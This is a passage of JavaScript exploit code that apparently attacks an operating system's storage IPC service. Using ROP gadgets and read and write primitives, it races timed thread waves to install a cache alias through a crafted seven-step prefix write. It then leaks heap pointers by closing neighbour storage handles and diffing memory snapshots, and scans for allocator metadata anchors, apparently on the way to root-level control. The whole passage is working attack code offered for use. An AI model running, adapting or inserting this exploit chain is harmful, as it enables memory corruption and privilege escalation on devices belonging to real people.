      negativeControlPassed, positiveAttempts: profileCounts.positive || 0,
      positiveWindows, positiveWindowFlips, positiveObservedRedirects,
      positiveOutsideWindowFlips, positiveQualifiedFlips,
      positiveHealthFailures, positiveGateFailures, positiveWindowRecords,
      pinQualificationDiagnostics};
}

export async function preparePostCanaryCandidate({
  config,
  helpers,
  canaryQualified,
  pktBuf,
  rootSession,
  storageHandle,
  workerStateSafe
}) {
  let candidateHandle = 0;
  let primeHex;
  let failureReason = null;
    // S13: Post-canary — candidate setup + control reads.
    var controlHex = "";
    var aliasControlHex = "";
    primeHex = "";
    var allocCost = null;

    if (canaryQualified && workerStateSafe) {
        // a) Control read at offset 0 from original storage (full cache block).
        var controlBuf = allocPage(config.CONTROL_SIZE + 0x2000);
        call_rop(GADGET_MEMSET, controlBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
        var controlRead = ipcStorageRead(storageHandle, 0, config.CONTROL_SIZE, controlBuf);
        if (controlRead.error === 0) controlHex = helpers.readHexBytes(controlBuf, 16);

        // b) Alias control at aliasOffset from original storage.
        var aliasBuf = allocPage(0x1000);
        call_rop(GADGET_MEMSET, aliasBuf, 0xA5n, 16n);
        var aliasRead = ipcStorageRead(storageHandle, config.ALIAS_OFFSET, 16, aliasBuf);
        if (aliasRead.error === 0) aliasControlHex = helpers.readHexBytes(aliasBuf, 16);

        var offsetsDistinct = controlHex && aliasControlHex && controlHex !== aliasControlHex;
        if (!offsetsDistinct) {
            failureReason = (!controlHex || !aliasControlHex)
                ? "baseline-control-read-failed"
                : "baseline-offsets-not-distinct";
            await log("BASELINE: FAIL offsets not distinct");
            canaryQualified = false;
        }
    }

    if (canaryQualified && workerStateSafe) {
        var countersBefore = readAllocationCounters(rootSession, pktBuf);
        var beforeHeap = countersBefore ? countersBefore[5] : null;

        candidateHandle = openContentStorage(rootSession);
        if (!candidateHandle) {
            failureReason = "candidate-storage-open-failed";
            await log("BASELINE: FAIL candidateHandle");
        } else {
            var countersAfter = readAllocationCounters(rootSession, pktBuf);
            var afterHeap = countersAfter ? countersAfter[5] : null;
            allocCost = (beforeHeap !== null && afterHeap !== null)
                ? beforeHeap - afterHeap : null;

            var primeBuf = allocPage(0x1000);
            call_rop(GADGET_MEMSET, primeBuf, 0xA5n, 16n);
            var primeRead = ipcStorageRead(candidateHandle, 0, 16, primeBuf);
            if (primeRead.error === 0) primeHex = helpers.readHexBytes(primeBuf, 16);
            var primeMatchesControl = primeHex && primeHex === controlHex;
            if (!primeHex) failureReason = "candidate-prime-read-failed";
            else if (!primeMatchesControl) failureReason = "candidate-prime-mismatch";

            await log("BASELINE: " + (primeMatchesControl ? "OK" : "FAIL") +
                " alloc=" + (allocCost !== null ? allocCost + "B" : "N/A") +
                (primeMatchesControl ? "" : " PRIME-MISMATCH"));
        }
    }

  if (!workerStateSafe)
      failureReason = "worker-state-unsafe";
  else if (!failureReason && !canaryQualified)
      failureReason = "canary-not-qualified";
  else if (!failureReason && !candidateHandle)
      failureReason = "candidate-storage-open-failed";
  else if (!failureReason && !primeHex)
      failureReason = "candidate-prime-read-failed";

  return {ok: true, canaryQualified, candidateHandle, primeHex, failureReason};
}

export async function installCacheAlias({
  config,
  helpers,
  REQ,
  canaryQualified,
  candidateHandle,
  dirtyFilePath,
  dirtyWriteBuf,
  dirtyWritePkt,
  gates,
  pinPkt,
  pktBuf,
  primeHex,
  rawScheduling,
  rootSession,
  savedHandle,
  sendIndices,
  triggerHandle,
  waveData,
  waveExtra,
  wavesJoined,
  wavesStarted,
  workerResources,
  workerStateSafe,
  fragmentBufs,
  triggerBuf,
  clearPkt,
  clearSendIndex,
  pinFirstWaveQualified,
  pinHandle,
  pinSendIndex,
  prePkt,
  preSendIndex,
  abortControlCanonical,
  canaryPath,
  setupPath,
  setupPkt,
  reportProgress = null
}) {
  let aliasInstalled;
  let candidateCacheNeedsRetirement = false;
  let copyStepsCompleted;
  let copyWavesTotal;
  let copyFailureReason;
  let copyStepFailures;
  let copyFailureCounts;
    // S14: Cache alias installation.
    aliasInstalled = false;
    copyWavesTotal = 0;
    copyStepsCompleted = 0;
    copyFailureReason = null;
    copyStepFailures = [];
    copyFailureCounts = Object.create(null);
    var noteCopyFailure = function(reason) {
        copyFailureCounts[reason] = (copyFailureCounts[reason] || 0) + 1;
    };

    if (!canaryQualified) copyFailureReason = "canary-not-qualified";
    else if (!workerStateSafe) copyFailureReason = "worker-state-unsafe";
    else if (!candidateHandle) copyFailureReason = "candidate-storage-unavailable";
    else if (!primeHex) copyFailureReason = "candidate-prime-read-unavailable";

    if (canaryQualified && workerStateSafe && candidateHandle && primeHex) {
        // Combined leak prefix (0x12 = 18 bytes):
        //   aliasOffset LE (8) + 0x4141414141414141 (8) + dirty=1 (1) + NUL (1)
        var leakPrefix = config.CACHE_ALIAS_PREFIX.slice();
        var steps = helpers.nulWrites(leakPrefix);
        if (steps.length !== 7) {
            copyFailureReason = "invalid-copy-plan";
            noteCopyFailure("invalid-copy-plan");
            await log("ALIAS: FAIL nulWrites=" + steps.length + " (expect 7)");
        } else {
            var allStepsOk = true;
            // Treat the cache entry as modified from the first attempted field
            // copy, even if a later timing gate rejects the wave.
            candidateCacheNeedsRetirement = true;

            for (var stepIdx = 0; stepIdx < steps.length; stepIdx++) {
                var step = steps[stepIdx];
                var stepConfirmed = false;
                var stepAttempts = 0;
                var stepWindowFail = 0;
                var stepPreLow = 0;
                var stepPathMiss = 0;
                var stepHardFailure = null;

                for (var batch = 0; batch < config.COPY_BATCHES && !stepConfirmed; batch++) {
                for (var ca = 0; ca < config.MAX_COPY_ATTEMPTS; ca++) {
                    stepAttempts++;

                    if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                            dirtyWriteBuf, dirtyWritePkt)) {
                        stepHardFailure = "dirty-write-failed";
                        noteCopyFailure(stepHardFailure);
                        await log("FAIL: step " + stepIdx + " dirty write");
                        allStepsOk = false; break;
                    }

                    resetWaveState(waveData.frames, waveData.backups, REQ,
                        waveData.pktBackups, gates, waveExtra);
                    var payloadSetup = helpers.configurePayload(step.bytes, {config, REQ,
                        fragmentBufs: fragmentBufs, triggerBuf: triggerBuf});
                    if (!payloadSetup.configured) {
                        stepHardFailure = "payload-setup-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }

                    var group = openReservationGroup(rootSession, pktBuf, 59);
                    if (!group.ok) {
                        stepHardFailure = "reservation-failed";
                        noteCopyFailure(stepHardFailure);
                        await log("FAIL: step " + stepIdx + " reservation");
                        allStepsOk = false; break;
                    }

                    prepPacket(REQ[9], 4, 8, []);
                    write8(REQ[9] + 0x10n, 2n);
                    write32(REQ[9] + 0x14n, BigInt(group.outer));
                    write32(REQ[9] + 0x1Cn, 0n);
                    write64(frameArgSlot(waveData.frames[9].frame,
                        waveData.frames[9].count, sendIndices[9], 0),
                        BigInt(group.session));
                    write64(frameArgSlot(waveData.frames[12].frame,
                        waveData.frames[12].count, sendIndices[12], 0),
                        BigInt(triggerHandle));
                    write32(pinPkt + 0x18n, 1009n);

                    var wave = executeWave(waveData.frames, rawScheduling,
                        workerResources, gates, sendIndices);
                    wavesStarted += wave.started === 13 ? 1 : 0;

                    if (wave.created < 13 || wave.started < 13) {
                        var relCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
                        closeReservationGroup(group, wave.created < 13 || relCode !== 0, pktBuf);
                        stepHardFailure = "worker-start-failed";
                        noteCopyFailure(stepHardFailure);
                        await log("FAIL: step " + stepIdx + " workers=" +
                            wave.created + "/" + wave.started);
                        workerStateSafe = wave.joined === 13;
                        allStepsOk = false; break;
                    }
                    if (wave.joined < 13) {
                        workerStateSafe = false;
                        stepHardFailure = "worker-join-failed";
                        noteCopyFailure(stepHardFailure);
                        allStepsOk = false; break;
                    }
                    wavesJoined++;

                    var wResult = helpers.analyzeWave("cache-" + stepIdx,
                        wave, waveData, group, false, {
                            config, REQ, clearPkt: clearPkt,
                            clearSendIndex: clearSendIndex, gates,
                            pinFirstWaveQualified: pinFirstWaveQualified,
                            pinHandle: pinHandle, pinPkt,
                            pinSendIndex: pinSendIndex, pktBuf,
                            prePkt: prePkt, preSendIndex: preSendIndex,
                            rootSession, sendIndices,
                            abortControlCanonical: abortControlCanonical,
                            canaryPath: canaryPath, savedHandle,
                            setupPath: setupPath, setupPkt: setupPkt
                        });

                    var releaseWasSent = roleSendCode(waveData.frames, 9,
                        sendIndices[9]) === 0;
                    closeReservationGroup(group, !releaseWasSent, pktBuf);

                    copyWavesTotal++;

                    var accepted = wResult.window &&
                        wResult.preReleaseUsed !== null &&
                        wResult.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD &&
                        wResult.changedPaths.length === 0;
                    if (reportProgress && accepted) {
                        await reportProgress("Cache alias: " +
                            "step " + (stepIdx + 1) + "/" + steps.length +
                            " confirmed; waves=" + copyWavesTotal +
                            "; step attempts=" + stepAttempts + ".");
                    }
                    await log(helpers.formatWaveSummaryLine(copyWavesTotal,
                        "cache-" + stepIdx, wResult,
                        accepted ? "copy-ok" : "copy-rejected", {config}));
                    if (!accepted) {
                        if (!wResult.window) {
                            stepWindowFail++;
                            noteCopyFailure("window-not-qualified");
                        }
                        else if (wResult.preReleaseUsed === null ||
                                 wResult.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD) {
                            stepPreLow++;
                            noteCopyFailure("pre-release-below-minimum");
                        } else if (wResult.changedPaths.length > 0) {
                            stepPathMiss++;
                            noteCopyFailure("path-mismatch");
                        }
                    }
                    if (accepted) {
                        candidateCacheNeedsRetirement = true;
                        stepConfirmed = true;
                        break;
                    }
                }
                }

                if (!allStepsOk || !stepConfirmed) {
                    var stepFailureReason = stepHardFailure ||
                        (stepWindowFail ? "window-not-qualified" :
                        stepPreLow ? "pre-release-below-minimum" :
                        stepPathMiss ? "path-mismatch" : "copy-attempts-exhausted");
                    if (!stepHardFailure) noteCopyFailure("copy-attempts-exhausted");
                    copyFailureReason = stepFailureReason;
                    copyStepFailures.push({step: stepIdx + 1,
                        attempts: stepAttempts, windowRejects: stepWindowFail,
                        preReleaseRejects: stepPreLow, pathMismatches: stepPathMiss,
                        reason: stepFailureReason});
                    await log("  step " + stepIdx + " FAIL att=" + stepAttempts +
                        " winFail=" + stepWindowFail + " preLow=" + stepPreLow +
                        " pathMiss=" + stepPathMiss);
                    allStepsOk = false; break;
                }

                copyStepsCompleted++;
                await log("  step " + stepIdx + " OK (att=" + stepAttempts + ")");
            }

            aliasInstalled = allStepsOk;
        }

        await log("ALIAS: " + (aliasInstalled ? "OK" : "FAIL") +
            " " + copyStepsCompleted + "/7 steps (" + copyWavesTotal + " waves)");
    }


  return {ok: true, aliasInstalled, candidateCacheNeedsRetirement,
      copyStepsCompleted, copyWavesTotal, copyFailureReason,
      copyFailureCounts, copyStepFailures, wavesJoined, wavesStarted,
      workerStateSafe};
}

export async function prepareReleaseNeighbors({
  config,
  candidateHandle,
  aliasInstalled,
  copyStepsCompleted,
  rootSession
}) {
    // This is a sampling cap, not a required count. Keep all successfully
    // opened/primed handles if a later allocation fails; callers can proceed
    // with the partial neighborhood.
    var MAX_EXTRA_NEIGHBORS = 8;
    const eligible = Boolean(candidateHandle &&
        (aliasInstalled || copyStepsCompleted > 0));
    const extraStorages = [];
    var attemptedStorages = 0;
    var failureReason = null;
    if (!eligible) return {ok: true, eligible, extraStorages,
        attemptedStorages, expectedStorages: MAX_EXTRA_NEIGHBORS, failureReason};

    // S15: Open and prime extra IStorage handles after installing the alias.
    // Their caches are allocated at higher heap addresses inside the alias
    // window. Prime each with 16 reads, one per 0x4000 block.
    var PRIME_BLOCKS = 16;
    var extraPrimeBuf = allocPage(0x1000);
    var totalPages = 0;
    for (var ei = 0; ei < MAX_EXTRA_NEIGHBORS; ei++) {
        attemptedStorages++;
        var eh = openContentStorage(rootSession);
        if (!eh) {
            failureReason = "storage-open-failed-at-" + (ei + 1);
            await log("WARN: extra IStorage " + ei + " open failed");
            break;
        }
        var primeOk = true;
        for (var pi = 0; pi < PRIME_BLOCKS; pi++) {
            var er = ipcStorageRead(eh, pi * config.CONTROL_SIZE, 16,
                extraPrimeBuf);
            if (er.error !== 0) {
                failureReason = "prime-read-failed-at-" + (ei + 1);
                await log("WARN: extra" + ei + " prime @0x" +
                    (pi * config.CONTROL_SIZE).toString(16) + " err=" +
                    hex32(er.error));
                primeOk = false;
                break;
            }
        }
        if (!primeOk) {
            closeHandle(eh);
            break;
        }
        totalPages += PRIME_BLOCKS;
        extraStorages.push(eh);
    }
    await log("Extra neighbors: " + extraStorages.length +
        "/" + MAX_EXTRA_NEIGHBORS + " maximum (" + totalPages +
        " cache pages primed)");

    return {ok: true, eligible, extraStorages, attemptedStorages,
        expectedStorages: MAX_EXTRA_NEIGHBORS, failureReason};
}

export async function captureReleaseBaseline({
  config,
  candidateHandle,
  primeHex,
  helpers
}) {
    // S16: Capture the initial cache window before closing any neighbor.
    const previousBuffer = allocPage(config.CACHE_READ_SIZE + 0x2000);
    const currentBuffer = allocPage(config.CACHE_READ_SIZE + 0x2000);

    // Keep the direct live-buffer comparison unchanged. Snapshot analysis
    // accepts copied byte arrays; materializing two MiB per release round
    // would add millions of read8 calls to this already-qualified sweep.
    call_rop(GADGET_MEMSET, previousBuffer, 0xA5n,
        BigInt(config.CACHE_READ_SIZE));
    await log("LEAK: baseline 2 MiB read");
    var read0 = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
        config.CACHE_READ_SIZE, previousBuffer);

    var prevEnd = 0;
    var prefix0 = "unread";
    var prefix0Ok = false;
    var snapshotOk = false;
    if (read0.error === 0) {
        prefix0 = helpers.readHexBytes(previousBuffer, 16);
        prefix0Ok = prefix0 === primeHex;

        prevEnd = config.CACHE_READ_SIZE;
        var last0 = helpers.readHexBytes(
            previousBuffer + BigInt(config.CACHE_READ_SIZE - 16), 16);
        if (last0 === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
            var lo = config.CONTROL_SIZE, hi = config.CACHE_READ_SIZE;
            while (lo < hi) {
                var mid = ((lo + hi) >>> 1) & ~7;
                if (read64(previousBuffer + BigInt(mid)) ===
                    0xA5A5A5A5A5A5A5A5n) hi = mid;
                else lo = mid + 8;
            }
            prevEnd = lo;
        }
        snapshotOk = prefix0Ok && prevEnd > config.CONTROL_SIZE;
    }
    await log("LEAK baseline: read=" + hex32(read0.error) +
        " alias=" + (prefix0Ok ? "match" : "mismatch") +
        " prefix=" + prefix0 + " data=0x" + prevEnd.toString(16) +
        " (" + (prevEnd / 1024).toFixed(1) + " KiB)" +
        " status=" + (snapshotOk ? "ready" : "rejected"));

    return {ok: true, previousBuffer, currentBuffer, prevEnd, snapshotOk,
        readError: read0.error, prefixMatches: prefix0Ok};
}

export async function releaseNeighborsAndFindPointers({
  config,
  candidateHandle,
  primeHex,
  extraStorages,
  baseline,
  helpers
}) {
    // S17: Close neighbors one at a time and compare each new snapshot with
    // the previous one. Keep the original worker handles open for later waves.
    extraStorages = extraStorages.slice();
    var pointerCandidates = [];
    var releaseRounds = 0;
    var totalChangedLinks = 0;
    var stopReason = baseline.snapshotOk
        ? (extraStorages.length ? null : "no-neighbors")
        : "baseline-not-qualified";
    var readError = null;
    var prevEnd = baseline.prevEnd;
    var snapshotOk = baseline.snapshotOk;
    var bufPrev = baseline.previousBuffer;
    var bufCur = baseline.currentBuffer;

    if (snapshotOk) {
        var neighbors = [];
        for (var ei = 0; ei < extraStorages.length; ei++) {
            neighbors.push({name: "extra" + ei, handle: extraStorages[ei]});
        }

        for (var ri = 0; ri < neighbors.length && snapshotOk; ri++) {
            var nb = neighbors[ri];
            await log("LEAK release " + (ri + 1) + "/" +
                neighbors.length + ": closing " + nb.name);
            var releaseCloseResult = Number(closeHandle(nb.handle)) >>> 0;
            if (nb.name.indexOf("extra") === 0) {
                var idx = parseInt(nb.name.slice(5));
                extraStorages[idx] = 0;
            }

            call_rop(GADGET_MEMSET, bufCur, 0xA5n,
                BigInt(config.CACHE_READ_SIZE));
            var readN = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
                config.CACHE_READ_SIZE, bufCur);

            if (readN.error !== 0) {
                stopReason = "snapshot-read-failed";
                readError = readN.error;
                await log("LEAK release " + (ri + 1) + "/" + neighbors.length +
                    " " + nb.name + ": close=" + hex32(releaseCloseResult) +
                    " read failed=" + hex32(readN.error));
                break;
            }

            var prefixN = helpers.readHexBytes(bufCur, 16);
            var prefixNOk = prefixN === primeHex;
            var curEnd = config.CACHE_READ_SIZE;
            var lastN = helpers.readHexBytes(
                bufCur + BigInt(config.CACHE_READ_SIZE - 16), 16);
            if (lastN === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
                var lo = config.CONTROL_SIZE, hi = config.CACHE_READ_SIZE;
                while (lo < hi) {
                    var mid = ((lo + hi) >>> 1) & ~7;
                    if (read64(bufCur + BigInt(mid)) ===
                        0xA5A5A5A5A5A5A5A5n) hi = mid;
                    else lo = mid + 8;
                }
                curEnd = lo;
            }

            var effectiveEnd = Math.min(prevEnd, curEnd);
            var blockCount = 0, changed = 0, clCount = 0;
            for (var off = config.CONTROL_SIZE;
                off + config.CONTROL_SIZE <= effectiveEnd;
                off += config.CONTROL_SIZE) {
                blockCount++;
                var prevHead = read64(bufPrev + BigInt(off));
                var curHead = read64(bufCur + BigInt(off));
                if (prevHead === curHead) continue;
                changed++;

                var tailMatch = true;
                for (var t = 8; t < config.CONTROL_SIZE; t += 8) {
                    if (read64(bufPrev + BigInt(off + t)) !==
                        read64(bufCur + BigInt(off + t))) {
                        tailMatch = false;
                        break;
                    }
                }
                if (tailMatch) clCount++;

                var cLo = Number(read32(bufCur + BigInt(off))) >>> 0;
                var cHi = Number(read32(bufCur + BigInt(off + 4))) >>> 0;
                var cBig = BigInt(cLo) | (BigInt(cHi) << 32n);
                var cVal = cLo + cHi * 0x100000000;
                var isPtr = cVal >= 0x100000000 && cBig < (1n << 39n);
                var isAligned = cVal % 0x4000 === 0;
                var low24ok = (cVal & 0xFFFFFF) !== 0;

                var zeroTail = true;
                for (var zt = 8; zt < 64; zt += 8) {
                    if (read64(bufCur + BigInt(off + zt)) !== 0n) {
                        zeroTail = false;
                        break;
                    }
                }
                var zeroAfter32 = true;
                for (var za = 32; za < config.CONTROL_SIZE; za += 8) {
                    if (read64(bufCur + BigInt(off + za)) !== 0n) {
                        zeroAfter32 = false;
                        break;
                    }
                }

                var strength = 0;
                if (tailMatch && isPtr && isAligned && low24ok)
                    strength = 3;
                else if (isPtr && isAligned && low24ok && zeroTail)
                    strength = 2;
                else if (isPtr && isAligned && low24ok && zeroAfter32)
                    strength = 1;
                if (strength > 0) {
                    pointerCandidates.push({
                        offset: off, target: cBig, round: ri + 1,
                        previous: prevHead,
                        neighbor: nb.name, changedLink: tailMatch,
                        zeroTail, zeroAfter32, strength
                    });
                }
            }

            await log("LEAK release " + (ri + 1) + "/" + neighbors.length +
                " " + nb.name + ": close=" + hex32(releaseCloseResult) +
                " read=ok alias=" + (prefixNOk ? "match" : "mismatch") +
                " prefix=" + prefixN + " data=0x" + curEnd.toString(16) +
                " compared=" + blockCount + " changed=" + changed +
                " changedLinks=" + clCount);
            totalChangedLinks += clCount;
            releaseRounds++;

            var tmp = bufPrev;
            bufPrev = bufCur;
            bufCur = tmp;
            prevEnd = curEnd;
        }
    }

    pointerCandidates.sort(function(a, b) {
        if (b.strength !== a.strength) return b.strength - a.strength;
        return a.target < b.target ? -1 : a.target > b.target ? 1 :
            a.offset - b.offset;
    });
    await log("=== SEQUENTIAL RELEASE: " + releaseRounds +
        " rounds, " + totalChangedLinks + " changedLinks, " +
        pointerCandidates.length + " qualified ===");
    for (var pi = 0; pi < pointerCandidates.length; pi++) {
        var c = pointerCandidates[pi];
        await log("  #" + (pi + 1) + " @0x" +
            c.offset.toString(16) + ": 0x" +
            c.target.toString(16) + " str=" + c.strength +
            " from=0x" + c.previous.toString(16) +
            " round=" + c.round + " (" + c.neighbor + ")" +
            (c.changedLink ? " [changed-link]" : "") +
            (c.zeroTail ? " [zero-tail]" : "") +
            (c.zeroAfter32 ? " [zero-after-32]" : ""));
    }

    return {ok: true, extraStorages, pointerCandidates,
        releaseRounds, totalChangedLinks, stopReason, readError};
}

export async function qualifyAddressPlan({
  config,
  helpers,
  addressCopy,
  aliasInstalled,
  candidateHandle,
  collectTimingProfile = false,
  reportProgress = null,
  pointerCandidates,
  primeHex,
  rootSession,
  savedHandle,
  storageHandle,
}) {
  let addressPlan = null;
  let addressReadVerified = false;
  let metadataAnchorChecks = 0;
  let metadataPageChecks = 0;
  let metadataPageProbes = 0;
  let rootCandidateScans = 0;
  let rootPidRead = false;
  let verifiedIdentityTargets = null;
  let domainSession = null;
  let rootCandidateRetryable = false;
  let rootStageVerified = false;
  let selectedAddressCandidate = null;
  let addressFailureReason = null;
  let addressFailureDetail = null;
  let changedLinkCandidates = 0;
  let validAddressPlans = 0;
  let addressAliasRequalified = null;
  let bucketPeriodQualified = null;
  let storageSizeError = null;
  const timingProfile = collectTimingProfile ? Object.create(null) : null;
    // S18: Address-plan read qualification (no target write).
    var addressCandidatesTested = 0;

    if (!candidateHandle) addressFailureReason = "candidate-storage-unavailable";
    else if (!aliasInstalled) addressFailureReason = "cache-alias-not-installed";
    else if (!pointerCandidates.length) addressFailureReason = "no-pointer-candidates";

    if (candidateHandle && aliasInstalled && pointerCandidates.length > 0) {
        var knownPointers = [];
        var knownTargetSet = {};
        var duplicateAddressTargets = 0;
        for (var pki = 0; pki < pointerCandidates.length; pki++) {
            var pointerItem = pointerCandidates[pki];
            if (pointerItem.strength !== 3 || !pointerItem.changedLink) continue;
            var targetKey = pointerItem.target.toString();
            if (knownTargetSet[targetKey]) {
                duplicateAddressTargets++;
                continue;
            }
            knownTargetSet[targetKey] = true;
            knownPointers.push(pointerItem);
        }
        // Match the reference ordering: strongest evidence first, then target
        // address. Each entry remains a candidate until the read guards pass.
        knownPointers.sort(function(a, b) {
            return a.target < b.target ? -1 : a.target > b.target ? 1 :
                a.offset - b.offset;
        });
        var knownPointerTotal = knownPointers.length;
        changedLinkCandidates = knownPointerTotal;
        if (duplicateAddressTargets > 0)
            await log("ADDRESS: skipped " + duplicateAddressTargets +
                " duplicate target records");
        if (knownPointers.length > config.MAX_ADDRESS_CANDIDATES) {
            await log("ADDRESS: candidate scan capped at " +
                config.MAX_ADDRESS_CANDIDATES + " of " + knownPointerTotal);
            knownPointers = knownPointers.slice(0, config.MAX_ADDRESS_CANDIDATES);
        }

        if (knownPointers.length === 0) {
            addressFailureReason = "no-strength-3-changed-link-target";
            await log("ADDRESS: skipped; no strength-3 changedLink target");
        } else {
            var sizeReply = ipcStorageGetSize(candidateHandle);
            if (sizeReply.error !== 0 || !sizeReply.size ||
                !Number.isSafeInteger(sizeReply.size)) {
                addressFailureReason = "storage-size-unavailable";
                storageSizeError = sizeReply.error;
                await log("ADDRESS: skipped; IStorage::GetSize=" +
                    hex32(sizeReply.error));
            } else {
                var candidatePlans = [];
                var allPointerTargets = pointerCandidates.map(function(item) {
                    return Number(item.target);
                });
                for (var kp = 0; kp < knownPointers.length; kp++) {
                    var candidatePlan = null;
                    try {
                        candidatePlan = CachePlan.buildLowerWindowPlan(
                            Number(knownPointers[kp].target), sizeReply.size,
                            0x28000, allPointerTargets);
                    } catch (planError) {
                        await log("ADDRESS candidate @0x" +
                            knownPointers[kp].target.toString(16) +
                            ": plan rejected (" + planError.message + ")");
                        continue;
                    }

                    var encodingControl = helpers.checkAddressHeaderEncoding(
                        candidatePlan.bytes, {savedHandle});
                    if (!encodingControl.ok) {
                        await log("ADDRESS candidate @0x" +
                            knownPointers[kp].target.toString(16) +
                            ": header encoding rejected invalid=" +
                            hex32(encodingControl.invalid.canonical) +
                            " encoded=" + hex32(encodingControl.encoded.canonical));
                        continue;
                    }
                    candidatePlans.push({candidate: knownPointers[kp],
                        plan: candidatePlan});
                }

                await log("ADDRESS: " + candidatePlans.length + "/" +
                    knownPointers.length + " changed-link candidates have valid plans" +
                    " (total=" + knownPointerTotal + ")");
                validAddressPlans = candidatePlans.length;
                if (!candidatePlans.length)
                    addressFailureReason = "no-valid-address-plans";
                if (candidatePlans.length > 0) {
                    addressPlan = candidatePlans[0].plan;
                    var aliasRecheckBuf = allocPage(0x1000);
                    var aliasRecheck = ipcStorageRead(candidateHandle,
                        config.ALIAS_OFFSET, 16, aliasRecheckBuf);
                    var aliasRequalified = aliasRecheck.error === 0 &&
                        helpers.readHexBytes(aliasRecheckBuf, 16) === primeHex;
                    addressAliasRequalified = aliasRequalified;
                    await log("ADDRESS-ALIAS: " +
                        (aliasRequalified ? "OK" : "FAIL"));
                    if (!aliasRequalified) {
                        addressFailureReason = "alias-recheck-failed";
                        addressFailureDetail = "read=" + hex32(aliasRecheck.error);
                        addressPlan = null;
                    }

                    if (addressPlan) {
                        var periodStartedAt = collectTimingProfile ? Date.now() : 0;
                        var periodResult = await helpers.qualifyCacheBucketPeriod({
                            candidateHandle, primeHex, storageHandle, addressCopy
                        });
                        if (collectTimingProfile)
                            timingProfile.period = (timingProfile.period || 0) +
                                Date.now() - periodStartedAt;
                        addressCopy = periodResult.addressCopy;
                        bucketPeriodQualified = periodResult.ok;
                        await log("ADDRESS: 0x28000 bucket period=" +
                            (bucketPeriodQualified ? "qualified" : "unqualified"));
                        if (!bucketPeriodQualified) {
                            addressFailureReason = "cache-bucket-period-unqualified";
                            addressPlan = null;
                        }
                    }

                    // A changed-link pointer is only a seed. Derive and validate
                    // allocator metadata anchors before attempting the layout
                    // capture; continue through bounded candidates on no-match.
                    for (var ai = 0; addressPlan && ai < candidatePlans.length; ai++) {
                        var addressCandidate = candidatePlans[ai];
                        addressPlan = addressCandidate.plan;
                        addressCandidatesTested++;
                        var addressLabel = "candidate " + (ai + 1) + "/" +
                            candidatePlans.length;
                        await log("ADDRESS " + addressLabel + ": offset=0x" +
                            addressCandidate.candidate.offset.toString(16) +
                            " target=0x" + addressPlan.target.toString(16) +
                            " readOff=0x" + addressPlan.readOffset.toString(16) +
                            " base=0x" + addressPlan.base.toString(16));

                        var addressReadStartedAt = collectTimingProfile ? Date.now() : 0;
                        var candidateResult = await helpers.verifyAddressCandidate(
                            addressPlan, addressLabel, ai + 1, {
                                config, addressPlan, candidateHandle, storageHandle,
                                addressCopy
                            });
                        if (collectTimingProfile)
                            timingProfile.addressReads =
                                (timingProfile.addressReads || 0) +
                                Date.now() - addressReadStartedAt;
                        addressPlan = candidateResult.addressPlan;
                        addressCopy = candidateResult.addressCopy;
                        if (candidateResult.verified) {
                            addressReadVerified = true;
                            selectedAddressCandidate = addressCandidate.candidate;
                            rootCandidateRetryable = false;
                            if (reportProgress)
                                await reportProgress("Address read passed; scanning the allocator metadata window...");
                            var metadataStartedAt = collectTimingProfile ? Date.now() : 0;
                            var metadataDiscovery =
                                await helpers.discoverMetadataAnchors(addressPlan,
                                    addressLabel, {config, addressPlan,
                                        candidateHandle, metadataAnchorChecks,
                                        reportProgress});
                            if (collectTimingProfile)
                                timingProfile.metadata =
                                    (timingProfile.metadata || 0) +
                                    Date.now() - metadataStartedAt;
                            addressPlan = metadataDiscovery.addressPlan;
                            metadataAnchorChecks = metadataDiscovery.metadataAnchorChecks;
                            var discoveredAnchorCount =
                                metadataDiscovery.anchors?.length || 0;
                            var poolProgress =
                                metadataDiscovery.poolCandidatesVisited !== undefined
                                    ? "; pool candidates=" +
                                        metadataDiscovery.poolCandidatesVisited + "/" +
                                        metadataDiscovery.poolCandidates
                                    : "";
                            if (reportProgress)
                                await reportProgress("Metadata scan complete: link checks=" +
                                    (metadataDiscovery.externalLinkChecks || 0) +
                                    poolProgress +
                                    "; valid anchors=" + discoveredAnchorCount +
                                    (discoveredAnchorCount
                                        ? "; qualifying metadata page..."
                                        : "; checking the next seed..."));
                            if (!metadataDiscovery.ok) {
                                addressFailureReason = "metadata-anchor-discovery-failed";
                                addressFailureDetail = metadataDiscovery.error || "unknown";
                                await log("METADATA: discovery stopped: " +
                                    metadataDiscovery.error);
                                if (metadataDiscovery.continueSeed &&
                                    ai + 1 < candidatePlans.length) {
                                    await log("METADATA: trying the next " +
                                        "changed-link seed");
                                    continue;
                                }
                                break;
                            }

                            var tryNextSeed = metadataDiscovery.anchors.length === 0 &&
                                metadataDiscovery.continueSeed;
                            if (metadataDiscovery.anchors.length === 0) {
                                addressFailureReason = "no-metadata-anchors";
                                addressFailureDetail = "poolHypotheses=" +
                                    (metadataDiscovery.poolCandidates || 0) +
                                    "; externalLinkChecks=" +
                                    (metadataDiscovery.externalLinkChecks || 0);
                            }
                            var stopSeedScan = false;
                            var rootScansForSeed = 0;
                            for (var mi = 0;
                                mi < metadataDiscovery.anchors.length &&
                                    rootCandidateScans < config.MAX_ROOT_LAYOUT_SCANS &&
                                    metadataPageProbes < config.MAX_METADATA_PAGE_PROBES;
                                mi++) {
                                var metadataAnchor = metadataDiscovery.anchors[mi];
                                metadataPageProbes++;
                                if (reportProgress)
                                    await reportProgress("Metadata page probe " +
                                        metadataPageProbes + "/" +
                                        config.MAX_METADATA_PAGE_PROBES +
                                        ": checking reciprocal-link and page guards...");
                                var pageStartedAt = collectTimingProfile ? Date.now() : 0;
                                var metadataPageResult = await helpers.qualifyMetadataPage(
                                    metadataAnchor, addressLabel + " page " +
                                        (mi + 1) + "/" + metadataDiscovery.anchors.length,
                                    allPointerTargets, {
                                        config, addressPlan, metadataPageProbes,
                                        storageHandle, candidateHandle, savedHandle,
                                        addressCopy
                                    });
                                if (collectTimingProfile)
                                    timingProfile.pages = (timingProfile.pages || 0) +
                                        Date.now() - pageStartedAt;
